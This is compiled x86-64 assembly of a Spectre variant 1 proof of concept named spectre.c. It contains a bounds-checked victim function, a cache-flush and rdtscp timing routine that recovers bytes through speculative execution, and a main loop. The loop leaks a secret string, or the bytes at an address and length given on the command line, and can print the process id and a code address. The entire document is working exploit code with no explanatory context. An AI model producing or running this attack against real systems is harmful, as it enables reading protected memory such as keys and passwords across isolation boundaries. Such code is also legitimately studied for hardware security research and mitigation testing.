	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -16(%rbp)
	movq	-16(%rbp), %rax
	movl	array1_size(%rip), %ecx
	movslq	%ecx, %rcx
	cmpq	%rcx, %rax
	jae	.LBB0_2
# %bb.1:
	movl	$1, -4(%rbp)
	jmp	.LBB0_3
.LBB0_2:
	movl	$0, -4(%rbp)
.LBB0_3:
	movl	-4(%rbp), %eax
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rax
	movl	array1_size(%rip), %ecx
	movslq	%ecx, %rcx
	cmpq	%rcx, %rax
	jae	.LBB1_6
# %bb.1:
	movq	-8(%rbp), %rax
	subq	$1, %rax
                                        # kill: def $eax killed $eax killed $rax
	movl	%eax, -12(%rbp)
.LBB1_2:                                # =>This Inner Loop Header: Depth=1
	cmpl	$0, -12(%rbp)
	jl	.LBB1_5
# %bb.3:                                #   in Loop: Header=BB1_2 Depth=1
	movslq	-12(%rbp), %rcx
	leaq	array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	array2(%rip), %rax
	movzbl	(%rax,%rcx), %ecx
	movzbl	temp(%rip), %eax
	andl	%ecx, %eax
                                        # kill: def $al killed $al killed $eax
	movb	%al, temp(%rip)
# %bb.4:                                #   in Loop: Header=BB1_2 Depth=1
	movl	-12(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -12(%rbp)
	jmp	.LBB1_2
.LBB1_5:
	jmp	.LBB1_6
.LBB1_6:
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$144, %rsp
	movq	%rdi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movl	$0, -64(%rbp)
	movl	$0, -48(%rbp)
.LBB2_1:                                # =>This Inner Loop Header: Depth=1
	cmpl	$256, -48(%rbp)                 # imm = 0x100
	jge	.LBB2_4
# %bb.2:                                #   in Loop: Header=BB2_1 Depth=1
	movslq	-48(%rbp), %rcx
	leaq	results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	.LBB2_1
.LBB2_4:
	movl	$999, -44(%rbp)                 # imm = 0x3E7
.LBB2_5:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_7 Depth 2
                                        #     Child Loop BB2_11 Depth 2
                                        #       Child Loop BB2_13 Depth 3
                                        #     Child Loop BB2_19 Depth 2
	cmpl	$0, -44(%rbp)
	jle	.LBB2_27
# %bb.6:                                #   in Loop: Header=BB2_5 Depth=1
	movl	$0, -48(%rbp)
.LBB2_7:                                #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpl	$256, -48(%rbp)                 # imm = 0x100
	jge	.LBB2_10
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	movl	-48(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	array2(%rip), %rax
	addq	%rcx, %rax
	clflush	(%rax)
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	.LBB2_7
.LBB2_10:                               #   in Loop: Header=BB2_5 Depth=1
	movl	-44(%rbp), %eax
	movl	array1_size(%rip), %ecx
	cltd
	idivl	%ecx
	movslq	%edx, %rax
	movq	%rax, -72(%rbp)
	movl	$29, -52(%rbp)
.LBB2_11:                               #   Parent Loop BB2_5 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_13 Depth 3
	cmpl	$0, -52(%rbp)
	jl	.LBB2_18
# %bb.12:                               #   in Loop: Header=BB2_11 Depth=2
	clflush	array1_size(%rip)
	movl	$0, -108(%rbp)
.LBB2_13:                               #   Parent Loop BB2_5 Depth=1
                                        #     Parent Loop BB2_11 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	movl	-108(%rbp), %eax
	cmpl	$100, %eax
	jge	.LBB2_16
# %bb.14:                               #   in Loop: Header=BB2_13 Depth=3
	jmp	.LBB2_15
.LBB2_15:                               #   in Loop: Header=BB2_13 Depth=3
	movl	-108(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -108(%rbp)
	jmp	.LBB2_13
.LBB2_16:                               #   in Loop: Header=BB2_11 Depth=2
	movl	-52(%rbp), %eax
	movl	$6, %ecx
	cltd
	idivl	%ecx
	movl	%edx, %eax
	subl	$1, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	cltq
	movq	%rax, -80(%rbp)
	movq	-80(%rbp), %rax
	movq	-80(%rbp), %rcx
	shrq	$16, %rcx
	orq	%rcx, %rax
	movq	%rax, -80(%rbp)
	movq	-72(%rbp), %rax
	movq	-80(%rbp), %rcx
	movq	-24(%rbp), %rdx
	xorq	-72(%rbp), %rdx
	andq	%rdx, %rcx
	xorq	%rcx, %rax
	movq	%rax, -80(%rbp)
	movq	-80(%rbp), %rdi
	callq	victim_function
# %bb.17:                               #   in Loop: Header=BB2_11 Depth=2
	movl	-52(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -52(%rbp)
	jmp	.LBB2_11
.LBB2_18:                               #   in Loop: Header=BB2_5 Depth=1
	movl	$0, -48(%rbp)
.LBB2_19:                               #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpl	$256, -48(%rbp)                 # imm = 0x100
	jge	.LBB2_25
# %bb.20:                               #   in Loop: Header=BB2_19 Depth=2
	imull	$167, -48(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -60(%rbp)
	movl	-60(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	array2(%rip), %rax
	addq	%rcx, %rax
	movq	%rax, -104(%rbp)
	leaq	-64(%rbp), %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	movq	%rax, -128(%rbp)                # 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-128(%rbp), %rcx                # 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	movq	%rax, -88(%rbp)
	movq	-104(%rbp), %rax
	movb	(%rax), %al
	movzbl	%al, %eax
	movl	%eax, -64(%rbp)
	leaq	-64(%rbp), %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	movq	%rax, -120(%rbp)                # 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-120(%rbp), %rcx                # 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	subq	-88(%rbp), %rax
	movq	%rax, -96(%rbp)
	cmpq	$50, -96(%rbp)
	ja	.LBB2_23
# %bb.21:                               #   in Loop: Header=BB2_19 Depth=2
	movl	-60(%rbp), %eax
	movl	%eax, -132(%rbp)                # 4-byte Spill
	movl	-44(%rbp), %eax
	movl	array1_size(%rip), %ecx
	cltd
	idivl	%ecx
	movl	-132(%rbp), %eax                # 4-byte Reload
	movslq	%edx, %rdx
	leaq	array1(%rip), %rcx
	movzbl	(%rcx,%rdx), %ecx
	cmpl	%ecx, %eax
	je	.LBB2_23
# %bb.22:                               #   in Loop: Header=BB2_19 Depth=2
	movslq	-60(%rbp), %rcx
	leaq	results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	results(%rip), %rax
	movl	%edx, (%rax,%rcx,4)
.LBB2_23:                               #   in Loop: Header=BB2_19 Depth=2
	jmp	.LBB2_24
.LBB2_24:                               #   in Loop: Header=BB2_19 Depth=2
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	.LBB2_19
.LBB2_25:                               #   in Loop: Header=BB2_5 Depth=1
	jmp	.LBB2_26
.LBB2_26:                               #   in Loop: Header=BB2_5 Depth=1
	movl	-44(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -44(%rbp)
	jmp	.LBB2_5
.LBB2_27:
	movl	-64(%rbp), %eax
	xorl	results(%rip), %eax
	movl	%eax, results(%rip)
	addq	$144, %rsp
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$80, %rsp
	movl	$0, -4(%rbp)
	movl	%edi, -8(%rbp)
	movq	%rsi, -16(%rbp)
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_3 Depth 2
                                        #     Child Loop BB3_9 Depth 2
                                        #       Child Loop BB3_11 Depth 3
	callq	getchar@PLT
                                        # kill: def $al killed $al killed $eax
	movb	%al, -17(%rbp)
	movsbl	-17(%rbp), %eax
	cmpl	$114, %eax
	jne	.LBB3_19
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	movq	secret(%rip), %rsi
	movq	secret(%rip), %rdx
	leaq	.L.str.1(%rip), %rdi
	movb	$0, %al
	callq	printf@PLT
	movq	secret(%rip), %rax
	leaq	array1(%rip), %rcx
	subq	%rcx, %rax
	movq	%rax, -32(%rbp)
	movq	secret(%rip), %rdi
	callq	strlen@PLT
                                        # kill: def $eax killed $eax killed $rax
	movl	%eax, -44(%rbp)
	movq	$0, -56(%rbp)
.LBB3_3:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpq	$131072, -56(%rbp)              # imm = 0x20000
	jae	.LBB3_6
# %bb.4:                                #   in Loop: Header=BB3_3 Depth=2
	movq	-56(%rbp), %rcx
	leaq	array2(%rip), %rax
	movb	$1, (%rax,%rcx)
# %bb.5:                                #   in Loop: Header=BB3_3 Depth=2
	movq	-56(%rbp), %rax
	addq	$1, %rax
	movq	%rax, -56(%rbp)
	jmp	.LBB3_3
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$3, -8(%rbp)
	jne	.LBB3_8
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	movq	-16(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	-32(%rbp), %rdx
	leaq	.L.str.2(%rip), %rsi
	movb	$0, %al
	callq	__isoc99_sscanf@PLT
	movq	-32(%rbp), %rax
	leaq	array1(%rip), %rcx
	subq	%rcx, %rax
	movq	%rax, -32(%rbp)
	movq	-16(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	.L.str.3(%rip), %rsi
	leaq	-44(%rbp), %rdx
	movb	$0, %al
	callq	__isoc99_sscanf@PLT
	movq	-32(%rbp), %rsi
	movl	-44(%rbp), %edx
	leaq	.L.str.4(%rip), %rdi
	movb	$0, %al
	callq	printf@PLT
.LBB3_8:                                #   in Loop: Header=BB3_1 Depth=1
	movl	-44(%rbp), %esi
	leaq	.L.str.5(%rip), %rdi
	movb	$0, %al
	callq	printf@PLT
	movl	$0, -60(%rbp)
.LBB3_9:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_11 Depth 3
	movl	-44(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -44(%rbp)
	cmpl	$0, %eax
	jl	.LBB3_18
# %bb.10:                               #   in Loop: Header=BB3_9 Depth=2
	movq	-32(%rbp), %rsi
	movq	secret(%rip), %rax
	movslq	-60(%rbp), %rcx
	movsbl	(%rax,%rcx), %edx
	movq	secret(%rip), %rax
	movslq	-60(%rbp), %rcx
	movsbl	(%rax,%rcx), %ecx
	leaq	.L.str.6(%rip), %rdi
	movb	$0, %al
	callq	printf@PLT
	movl	-60(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -60(%rbp)
	movq	-32(%rbp), %rdi
	movq	%rdi, %rax
	addq	$1, %rax
	movq	%rax, -32(%rbp)
	leaq	-46(%rbp), %rsi
	leaq	-40(%rbp), %rdx
	callq	readMemoryByte
	movl	results(%rip), %eax
	movl	%eax, -64(%rbp)
	movl	$1, -68(%rbp)
.LBB3_11:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_9 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	cmpl	$256, -68(%rbp)                 # imm = 0x100
	jge	.LBB3_17
# %bb.12:                               #   in Loop: Header=BB3_11 Depth=3
	movl	-68(%rbp), %eax
	subl	$1, %eax
	movslq	%eax, %rcx
	leaq	results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movl	%eax, -72(%rbp)
	movslq	-68(%rbp), %rcx
	leaq	results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movl	%eax, -76(%rbp)
	movl	-72(%rbp), %eax
	cmpl	-76(%rbp), %eax
	jle	.LBB3_15
# %bb.13:                               #   in Loop: Header=BB3_11 Depth=3
	movl	-72(%rbp), %eax
	subl	-76(%rbp), %eax
	cmpl	$100, %eax
	jle	.LBB3_15
# %bb.14:                               #   in Loop: Header=BB3_11 Depth=3
	movl	-68(%rbp), %esi
	subl	$1, %esi
	movl	-68(%rbp), %eax
	subl	$1, %eax
	movslq	%eax, %rcx
	leaq	results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	leaq	.L.str.7(%rip), %rdi
	movb	$0, %al
	callq	printf@PLT
	movl	-68(%rbp), %esi
	movslq	-68(%rbp), %rcx
	leaq	results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	leaq	.L.str.7(%rip), %rdi
	movb	$0, %al
	callq	printf@PLT
.LBB3_15:                               #   in Loop: Header=BB3_11 Depth=3
	jmp	.LBB3_16
.LBB3_16:                               #   in Loop: Header=BB3_11 Depth=3
	movl	-68(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -68(%rbp)
	jmp	.LBB3_11
.LBB3_17:                               #   in Loop: Header=BB3_9 Depth=2
	leaq	.L.str.8(%rip), %rdi
	movb	$0, %al
	callq	printf@PLT
	jmp	.LBB3_9
.LBB3_18:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_26
.LBB3_19:                               #   in Loop: Header=BB3_1 Depth=1
	movsbl	-17(%rbp), %eax
	cmpl	$10, %eax
	jne	.LBB3_21
# %bb.20:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_1
.LBB3_21:                               #   in Loop: Header=BB3_1 Depth=1
	movsbl	-17(%rbp), %eax
	cmpl	$105, %eax
	jne	.LBB3_23
# %bb.22:                               #   in Loop: Header=BB3_1 Depth=1
	movb	$0, %al
	callq	getpid@PLT
	movl	%eax, %edx
	leaq	.L.str.9(%rip), %rdi
	leaq	check(%rip), %rsi
	addq	$33, %rsi
	movb	$0, %al
	callq	printf@PLT
	jmp	.LBB3_24
.LBB3_23:
	jmp	.LBB3_27
.LBB3_24:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_25
.LBB3_25:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_26
.LBB3_26:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_1
.LBB3_27:
	xorl	%eax, %eax
	addq	$80, %rsp
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function